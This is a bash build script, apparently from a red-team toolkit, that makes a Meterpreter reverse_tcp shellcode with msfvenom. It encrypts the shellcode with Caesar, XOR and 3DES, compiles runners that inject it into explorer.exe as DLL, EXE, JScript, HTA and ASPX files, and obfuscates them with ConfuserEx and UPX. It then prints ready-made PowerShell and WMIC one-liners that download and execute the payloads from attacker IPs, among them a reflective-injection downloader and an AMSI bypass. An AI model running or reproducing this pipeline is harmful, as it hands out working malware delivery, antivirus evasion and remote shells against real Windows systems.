#!/bin/bash

HOME=`echo $HOME`
CURRENT_DIR=`echo $PWD`
PAYLOADS=$CURRENT_DIR"/payloads"
CONFUSER=$CURRENT_DIR"/ConfuserEx/Confuser.CLI.exe"
NET_OBFUSCATOR=$CURRENT_DIR"/NET-Obfuscate/NET-Obfuscate.exe"
OUTPUT_CAESAR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/Caesar"
OUTPUT_XOR_DIR=$CURRENT_DIR"/payloads/ConfuserEx/XOR"

PROCESS_TO_INJECT="EXPLORER.EXE"
MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST="192.168.100.128"
LPORT=443


#Generating a shellcode
MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f csharp -o shellcode.txt"
echo "[+] Generating a shellcode ..."
msfvenom$MSFVENOM &>/dev/null
#BYTES=`cat shellcode.txt | grep "new byte\[" | grep -Po "\\d+"`

#Reading the contents
echo "[+] Reading the shellcode.txt ..."
FILENAME="shellcode.txt"
SHELLCODE=`cat $FILENAME | tr -d '\n' | awk -F \{ '{print $2}' | awk -F \} '{print $1}'`
#echo $SHELLCODE

# Appending Shellcode to encrypters
echo "[+] Appending Shellcode ..."
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${SHELLCODE}"' }/g' Templates/Caesar/caesar_encrypter.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${SHELLCODE}"' }/g' Templates/XOR/xor_encrypter.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${SHELLCODE}"' }/g' Templates/XOR/xor_encrypter_v2.cs 

# Update the Injected Process name
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/Caesar/shellcode_runner_assembly.cs
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/Caesar/shellcode_runner_assembly_numa.cs
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/XOR/shellcode_runner_assembly.cs
sed -i 's/Process.GetProcessesByName(.*.).0..Id/Process.GetProcessesByName("'${PROCESS_TO_INJECT}'")[0].Id/g' Templates/XOR/shellcode_runner_assembly_numa.cs


# Complile Encrypters.cs 
echo "[+] Compile the CS file..."
mcs Templates/Caesar/caesar_encrypter.cs
mcs Templates/XOR/xor_encrypter.cs
mcs Templates/XOR/xor_encrypter_v2.cs

# Generating Encrypted Shellcodes.
echo "[+] Generating Encrypted shellcodes ..."
CAESARED_SHELLCODE=`mono Templates/Caesar/caesar_encrypter.exe` 
XORED_SHELLCODE=`mono Templates/XOR/xor_encrypter.exe`
XORED_SHELLCODEv2=`mono Templates/XOR/xor_encrypter_v2.exe`
#echo $CAESARED_SHELLCODE 

# Append Encrypted Shellcodes to Shellcode Runners.
#echo "[+] Appending encrypted Caesared Shellcodes ..."
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_numa.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${CAESARED_SHELLCODE}"' }/g' Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs

sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_numa.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_numa_marshal.cs
sed -i 's/byte.. buf = new byte.. . .* ./byte[] buf = new byte[] { '"${XORED_SHELLCODE}"' }/g' Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs

sed -i 's/unsigned char enc_payload.. . .*./unsigned char enc_payload[] = { '"${XORED_SHELLCODEv2}"' };/g' Templates/XOR/shellcode_runner_xor.cpp


# Compile Shellcode Runner as DLL
echo "[+] Creating DLL files..."
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly.dll Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa.dll Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.dll Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -target:library -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.dll Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null

mcs -target:library -out:payloads/XOR/shellcode_runner_assembly.dll Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_numa.dll Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.dll Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -target:library -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.dll Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null

#mcs -target:library -platform:x86 -out:ExampleAssembly.dll shellcode_runner.cs
#cp ExampleAssembly.dll payloads/

# Complile the Shellcode Runner as EXE
echo "[+] Creating EXE file ..."
mcs -out:payloads/Caesar/shellcode_runner_assembly.exe Templates/Caesar/shellcode_runner_assembly.cs &>/dev/null
mcs -out:payloads/Caesar/shellcode_runner_assembly_numa.exe Templates/Caesar/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -out:payloads/Caesar/shellcode_runner_assembly_numa_marshal.exe Templates/Caesar/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -out:payloads/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null

mcs -out:payloads/XOR/shellcode_runner_assembly.exe Templates/XOR/shellcode_runner_assembly.cs &>/dev/null
mcs -out:payloads/XOR/shellcode_runner_assembly_numa.exe Templates/XOR/shellcode_runner_assembly_numa.cs &>/dev/null
mcs -out:payloads/XOR/shellcode_runner_assembly_numa_marshal.exe Templates/XOR/shellcode_runner_assembly_numa_marshal.cs &>/dev/null
mcs -out:payloads/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe Templates/XOR/shellcode_runner_assembly_FlsAlloc_marshal.cs &>/dev/null


echo "[+] Creating C++ EXE (plus UPX) ..."
x86_64-w64-mingw32-gcc Templates/XOR/shellcode_runner_xor.cpp -o payloads/XOR/shellcode_runner_cpp.exe &>/dev/null
upx -9 payloads/XOR/shellcode_runner_cpp.exe &>/dev/null


# Generate a payload
echo "[+] Creating JS file ..."
mono DotNetToJScript.exe payloads/XOR/shellcode_runner_assembly.dll --lang=Jscript --ver=v4 -o payloads/DotNetToJScript/runner.js -c Runner.TestClass &>/dev/null


# Copy file share
#echo "[+] shellcode_runner.js copied to Payloads"
tr -d $'\r' < payloads/DotNetToJScript/runner.js > payloads/DotNetToJScript/shellcode_runner.js

echo "[+] Creating HTA file ..."
python add_code.py

echo "[+] Creating XSL file ..."

echo "[+] Creating TXT file ..."
cp Templates/AMSI/amsi_runner_template.txt payloads/AMSI/shellcode_runner.txt
sed -i 's/SHELLCODE/'"${SHELLCODE}"'/g' payloads/AMSI/shellcode_runner.txt

echo "[+] Creating web.config file (Non-Encrypted)..."
MSFVENOM=" -p $MSFVENOM_PAYLOAD LHOST=$LHOST LPORT=$LPORT -f aspx -o payloads/ASPX/shellcode_runner.aspx"
msfvenom$MSFVENOM &>/dev/null
python add_code2.py

echo "[+] Creating ASPX file (Non-Encrypted) ..."
echo "[+] Unhooking AMSI ..."
echo " [*] Upload unhook_amsi.exe and MinHook.NET.dll to the victim "
echo " [*] Files are unders: payloads/AMSI/"
echo " [*] Execution: unhook_amsi.exe http://<KALI>/shellcode_runner.exe "

echo "[+] Generating a 3DES Shellcode Runner ..."
echo " [*] Execution of 3DES ..."
echo " [1] Example: des_decryptor.exe \"http://<KALI>/shellcode_runner_assembly_3des.exe\""
echo " [2] Example: des_decryptor_embeded.exe"
pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_3des.exe'" &>/dev/null
pwsh -c ". ./Templates/3DES/TripleDESEncryptor.ps1;TripleDESEncryption -Password oqphnbt0kuedizy4m3avx6r5lf21jc8s -Salt vh9b4tsxrl1560wg8nda2meuc7yjzop3 -File 'payloads/XOR/shellcode_runner_assembly_numa_marshal.exe' -EncryptedBinaryFile 'payloads/3DES/shellcode_runner_assembly_numa_marshal_3des.exe'" &>/dev/null
pwsh -c "\$bytes = [System.IO.File]::ReadAllBytes(\"payloads/3DES/shellcode_runner_assembly_3des.exe\");\$EncodedText = [Convert]::ToBase64String(\$bytes);\$encodedText > payloads/3DES/shellcode_runner_b64.txt"
pwsh -c "\$bytes = [System.IO.File]::ReadAllBytes(\"payloads/3DES/shellcode_runner_assembly_numa_marshal_3des.exe\");\$EncodedText=[Convert]::ToBase64String(\$bytes);\$encodedText > payloads/3DES/shellcode_runner_marshal_b64.txt"
B64_EMBEDED=`cat payloads/3DES/shellcode_runner_b64.txt`
B64_EMBEDED_MARSHAL=`cat payloads/3DES/shellcode_runner_marshal_b64.txt`
cp Templates/3DES/des_decryptor_embeded.cs payloads/3DES/des_decryptor_embeded.cs
cp Templates/3DES/des_decryptor_embeded_marshal.cs payloads/3DES/des_decryptor_embeded_marshal.cs
sed -i 's#.*EncryptedB64String = .B64_PAYLOAD.#string EncryptedB64String = "'${B64_EMBEDED}'"#g' payloads/3DES/des_decryptor_embeded.cs
sed -i 's#.*EncryptedB64String = .B64_PAYLOAD.#string EncryptedB64String = "'${B64_EMBEDED_MARSHAL}'"#g' payloads/3DES/des_decryptor_embeded_marshal.cs
mcs Templates/3DES/des_decryptor.cs &>/dev/null
mcs payloads/3DES/des_decryptor_embeded.cs &>/dev/null
mcs payloads/3DES/des_decryptor_embeded_marshal.cs &>/dev/null 
cp Templates/3DES/des_decryptor.exe payloads/3DES/des_decryptor.exe

echo "[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ..."
echo ""
echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe"
#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa_marshal.exe"
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa_marshal.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa_marshal.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.exe -o $OUTPUT_CAESAR_DIR &>/dev/null
#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.dll"
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
echo " [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa_marshal.dll"
mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_numa_marshal.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_CAESAR_DIR/shellcode_runner_assembly_numa_marshal.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
#mono $CONFUSER $PAYLOADS/Caesar/shellcode_runner_assembly_FlsAlloc_marshal.dll -o $OUTPUT_CAESAR_DIR &>/dev/null
#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly.exe -o $OUTPUT_XOR_DIR &>/dev/null
echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa.exe"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa.exe -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)" 
echo "/*--------------------------------------------------------------------*/"
echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa_marshal.exe"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa_marshal.exe -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa_marshal.exe`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_FlsAlloc_marshal.exe -o $OUTPUT_XOR_DIR &>/dev/null
#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly.dll -o $OUTPUT_XOR_DIR &>/dev/null
echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa.dll"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa.dll -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
echo " [!] Obfuscating XOR -> shellcode_runner_assembly_numa_marshal.dll"
mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_numa_marshal.dll -o $OUTPUT_XOR_DIR &>/dev/null
OBFUSCATED=`mono $NET_OBFUSCATOR --in-file $OUTPUT_XOR_DIR/shellcode_runner_assembly_numa_marshal.dll`
CLASS=`echo $OBFUSCATED |grep -oP '(?<=NonEmulated -> ).\w+'`
PROGRAM=`echo $OBFUSCATED |grep -oP '(?<=Program -> ).\w+'`
MAIN=`echo $OBFUSCATED |grep -oP '(?<=Main -> ).\w+'`
echo " [*] PS>\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo " [*] PS>\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo " [*] PS>\$ass.GetType(\"${CLASS}.${PROGRAM}\").GetMethod(\"${MAIN}\").Invoke(\$null,\$null)"
echo "/*--------------------------------------------------------------------*/"
#mono $CONFUSER $PAYLOADS/XOR/shellcode_runner_assembly_FlsAlloc_marshal.dll -o $OUTPUT_XOR_DIR &>/dev/null

echo ""
echo ""
echo "/*------------------------------------.NET ASSEMBLY EXECUTION---------------------------------------------------------*/"
# Execution of DLL/EXE
echo ""
echo "[+] Assembly - Local Execution or via SMB [+]"
echo "\$data=[IO.File]::ReadAllBytes('shellcode_runner.exe|dll')"
echo "\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo "\$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))"

echo ""
echo "[+] Assembly - Remote Execution  [+]"
echo "\$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')"
echo "\$ass=[System.Reflection.Assembly]::Load(\$data)"
echo "\$ass.GetType(\"Runner.TestClass\").GetMethod(\"Main\").Invoke(\$null,@(,\$null))"

echo ""
echo "[+] XSL execution [+]"
echo "wmic process list /FORMAT:evil.xsl"
echo "wmic os get /FORMAT:\"https://example.com/evil.xsl\""

echo ""
echo "[+] TXT execution - AMSI bypass [+]"
echo "powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.txt'));"


echo ""
echo "[+] Proxy Aware Downloader [+]"
echo "powershell -nop -exec bypass -c \"\$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://\$proxyAddr\");\$webclient=(New-Object System.Net.WebClient);\$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';\$webClient.Headers.Add(\"User-Agent\", \$userAgent);\$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;\$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;\$bytes=\$webclient.DownloadData('http://192.168.49.136/shellcode_runner_assembly.exe');\$webclient.DownloadString('http://192.168.49.136/Invoke-ReflectivePEInjection.ps1')|IEX;\$procid=(Get-Process -Name explorer).Id;Invoke-ReflectivePEInjection -PEBytes \$bytes -ProcId \$procid\""
echo ""
echo "powershell -nop -exec bypass -c \"\$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://\$proxyAddr\");\$webclient=(New-Object System.Net.WebClient);\$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';\$webClient.Headers.Add(\"User-Agent\", \$userAgent);\$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;\$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;\$bytes=\$webclient.DownloadString('http://192.168.49.162/shellcode_runner.txt')|IEX;\""

echo ""
echo "[+] AMSI + Proxy Aware - One liner [+]"
echo "powershell -nop -exec bypass -c \"\$a=[Ref].Assembly.GetTypes();Foreach(\$b in \$a) {if (\$b.Name -like \"*iUtils\"){\$c=\$b}};\$d=\$c.GetFields('NonPublic,Static');Foreach(\$e in \$d) {if (\$e.Name -like \"*Context\") {\$f=\$e}};\$g=\$f.GetValue(\$null);[IntPtr]\$ptr=\$g;[Int32[]]\$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy(\$buf, 0, \$ptr, 1);\$proxyAddr=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' | Select-Object ProxyServer).ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://\$proxyAddr\");\$webclient=(New-Object System.Net.WebClient);\$userAgent=(Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent';\$webClient.Headers.Add(\"User-Agent\", \$userAgent);\$webClient.Proxy=[System.Net.WebRequest]::DefaultWebProxy;\$webClient.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;\$bytes=\$webclient.DownloadString('http://192.168.49.162/shellcode_runner.txt')|IEX;\""
# Delete Files
rm shellcode.txt

##Compile to Executable
#mcs shellcode_runner.cs

##Complile to DLL
#mcs -target:library -out:ProcessInjection.dll shellcode_runner.cs
